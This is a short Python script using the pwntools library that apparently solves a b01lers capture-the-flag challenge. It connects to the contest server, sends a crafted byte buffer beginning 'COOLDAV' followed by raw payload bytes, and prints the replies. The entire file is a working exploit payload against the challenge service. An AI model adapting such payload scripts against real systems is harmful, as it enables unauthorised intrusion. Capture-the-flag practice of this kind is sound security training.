from pwn import *

p = remote('pwn.ctf.b01lers.com', 1001)

buf = b'COOLDAV\x01\x52\x40\x93\x05\x92\x94\x52\x10\x11\x0f\xdc\x49\xd6\xd5\x04\x11'
p.recv(1024)
p.sendline(buf)
print(p.recv(1024))
print(p.recv(1024))
